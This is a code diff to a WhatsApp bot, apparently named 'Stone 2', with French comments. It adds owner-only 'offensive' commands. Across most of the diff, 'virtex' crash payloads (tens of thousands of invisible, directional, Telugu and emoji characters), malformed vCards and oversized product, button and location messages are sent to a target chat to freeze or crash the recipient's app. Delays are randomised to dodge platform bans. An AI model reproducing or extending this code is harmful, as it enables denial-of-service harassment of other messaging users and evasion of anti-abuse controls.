@@ -26,10 +26,19 @@ if (!fs.existsSync(TEMP_DIR)) fs.mkdirSync(TEMP_DIR, { recursive: true });
 
 // --- COLLECTIONS DE TEXTES SPÉCIAUX (VIRTEX) ---
 const VIRTEX_PAYLOADS = [
-    "\u200e\u200f".repeat(10000), // Caractères de direction RTL/LTR
-    "\u00ad".repeat(10000), // Soft Hyphen
-    "\u200b".repeat(20000), // Zero-width space
-    "\u061c".repeat(10000) // Arabic Letter Mark
+    "\u200e\u200f".repeat(15000), // Caractères de direction RTL/LTR (Surcharge de rendu)
+    "\u00ad".repeat(15000), // Soft Hyphen
+    "\u200b".repeat(25000), // Zero-width space (Saturation de mémoire)
+    "\u061c".repeat(15000), // Arabic Letter Mark
+    "జ్ఞా".repeat(5000), // Telugu character (Crash de rendu sur certains OS)
+    "0".repeat(100000), // Surcharge de buffer simple
+    "🔴".repeat(10000) + "⚫".repeat(10000), // Crash visuel
+    "🏳️‍🌈".repeat(5000) + "🏴‍☠️".repeat(5000) // Surcharge d'emojis complexes
+];
+
+const ADVANCED_VCARDS = [
+    'BEGIN:VCARD\nVERSION:3.0\nFN:' + "☣️".repeat(5000) + '\nORG:' + "🔥".repeat(5000) + ';\nEND:VCARD',
+    'BEGIN:VCARD\nVERSION:3.0\nFN:System Error\nTEL;type=CELL;type=VOICE;type=pref:+' + "1".repeat(1000) + '\nEND:VCARD'
 ];
 
 // --- VARIABLES GLOBALES ---
@@ -372,18 +381,113 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 return;
             }
 
-            // Crash Test (Virtex)
+            // Crash Test (Virtex) - Version Améliorée
             if (lowerText.startsWith("crash")) {
-                const count = parseInt(lowerText.split(" ")[1]) || 5;
-                await sock.sendMessage(remoteJid, { text: `☣️ *CRASH TEST*\nEnvoi de ${count} charges lourdes...` });
+                const args = lowerText.split(" ");
+                const count = parseInt(args[1]) || 5;
+                const type = args[2] || "mix"; // Types: text, vcard, mix
+
+                await sock.sendMessage(remoteJid, { text: `☣️ *CRASH TEST PRO ACTIVÉ*\nCible: ${remoteJid}\nCharges: ${count}\nType: ${type.toUpperCase()}` });
+                
                 for (let i = 0; i < count; i++) {
-                    const payload = VIRTEX_PAYLOADS[Math.floor(Math.random() * VIRTEX_PAYLOADS.length)];
-                    await sock.sendMessage(remoteJid, { text: payload });
-                    await sleep(200);
+                    if (!current.isBotActive) break;
+
+                    try {
+                        if (type === "text" || (type === "mix" && i % 2 === 0)) {
+                            const payload = VIRTEX_PAYLOADS[Math.floor(Math.random() * VIRTEX_PAYLOADS.length)];
+                            await sock.sendMessage(remoteJid, { text: payload + getInvisibleJunk() });
+                        } else {
+                            const vcard = ADVANCED_VCARDS[Math.floor(Math.random() * ADVANCED_VCARDS.length)];
+                            await sock.sendMessage(remoteJid, { 
+                                contacts: { 
+                                    displayName: '⚠️ System Failure', 
+                                    contacts: [{ vcard }] 
+                                } 
+                            });
+                        }
+                    } catch (e) {
+                        console.error("Erreur lors de l'envoi du crash:", e);
+                    }
+                    
+                    // Délai variable pour éviter le ban tout en saturant la cible
+                    await sleep(150 + Math.random() * 100);
                 }
-                await sock.sendMessage(remoteJid, { text: "✅ Opération terminée." });
+                await sock.sendMessage(remoteJid, { text: "✅ *SÉQUENCE DE CRASH TERMINÉE*" });
                 return;
             }
+            
+            // --- NOUVELLES MÉTHODES OFFENSIVES 2026 ---
+
+            // 1. Crash de Catalogue (Freeze discussion)
+            if (lowerText.startsWith("catcrash")) {
+                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU CATALOG-CRASH...*" });
+                const payload = "☣️".repeat(10000);
+                await sock.sendMessage(remoteJid, {
+                    product: {
+                        product: {
+                            productImage: { url: "https://files.catbox.moe/6uhomx.png" },
+                            productId: "stone2-crash-" + Date.now(),
+                            title: payload,
+                            description: payload,
+                            currencyCode: "USD",
+                            priceAmount1000: "999999999",
+                            retailerId: "stone2-retailer",
+                            url: "https://wa.me/stone2"
+                        },
+                        businessOwnerJid: sock.user.id
+                    }
+                });
+                await sock.sendMessage(remoteJid, { text: "✅ *CATALOG-CRASH ENVOYÉ*" });
+                return;
+            }
+
+            // 2. Boutons Malformés (Lag/Crash)
+            if (lowerText.startsWith("btncrash")) {
+                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU BUTTON-CRASH...*" });
+                const payload = "🔥".repeat(5000);
+                const buttons = [
+                    { buttonId: 'id1', buttonText: { displayText: payload }, type: 1 },
+                    { buttonId: 'id2', buttonText: { displayText: payload }, type: 1 }
+                ];
+                await sock.sendMessage(remoteJid, {
+                    text: "⚠️ System Alert",
+                    footer: payload,
+                    buttons: buttons,
+                    headerType: 1
+                });
+                await sock.sendMessage(remoteJid, { text: "✅ *BUTTON-CRASH ENVOYÉ*" });
+                return;
+            }
+
+            // 3. Localisation Fantôme (Map Crash)
+            if (lowerText.startsWith("loccrash")) {
+                await sock.sendMessage(remoteJid, { text: "☣️ *LANCEMENT DU LOCATION-CRASH...*" });
+                await sock.sendMessage(remoteJid, {
+                    location: {
+                        degreesLatitude: 99999999,
+                        degreesLongitude: 99999999,
+                        name: "☣️".repeat(10000),
+                        address: "🔥".repeat(10000)
+                    }
+                });
+                await sock.sendMessage(remoteJid, { text: "✅ *LOCATION-CRASH ENVOYÉ*" });
+                return;
+            }
+// Commande Ultra-Crash (65000+ caractères)
+            if (lowerText.startsWith("ultra")) {
+                const char = "జ్ఞా";
+                const payload = char.repeat(66000);
+                await sock.sendMessage(remoteJid, { text: "☣️ *CHARGEMENT DE L'ULTRA-CRASH...*" });
+                try {
+                    await sock.sendMessage(remoteJid, { text: payload });
+                    await sock.sendMessage(remoteJid, { text: "✅ *ULTRA-CRASH ENVOYÉ*" });
+                } catch (e) {
+                    console.error("Erreur Ultra-Crash:", e);
+                    await sock.sendMessage(remoteJid, { text: "❌ Échec de l'envoi massif." });
+                }
+                return;
+            }
+
         }
 
         // --- COMMANDES PUBLIQUES / MIXTES ---
@@ -407,6 +511,10 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
                 `*--- OFFENSIF (Proprio) ---*\n` +
                 `- *love [texte] [qté] [ms]* : Spam optimisé\n` +
                 `- *crash [nombre]* : Envoi de Virtex\n` +
+                `- *ultra* : Envoi massif de caractères (65k+)\n` +
+                `- *catcrash* : Crash via Catalogue (Freeze)\n` +
+                `- *btncrash* : Crash via Boutons (Lag)\n` +
+                `- *loccrash* : Crash via Localisation (Map)\n` +
                 `- *stop* : Arrêter le spam en cours\n\n` +
                 `*Statut :* ${current.isBotActive ? "ACTIF ✅" : "INACTIF 🛑"}`;
             
@@ -559,7 +667,7 @@ async function createBotInstance(phoneNumber, sockToNotify = null, jidToNotify =
 async function start() {
     console.log("--- DÉMARRAGE STONE 2 (VERSION FUSIONNÉE) ---");
     // Remplacez le numéro ci-dessous par votre numéro principal
-    const mainNum = "224661108205"; 
+    const mainNum = "16062620863"; 
     console.log(`Démarrage automatique pour le numéro : ${mainNum}`);
     createBotInstance(mainNum.replace(/[^0-9]/g, ""));
 }
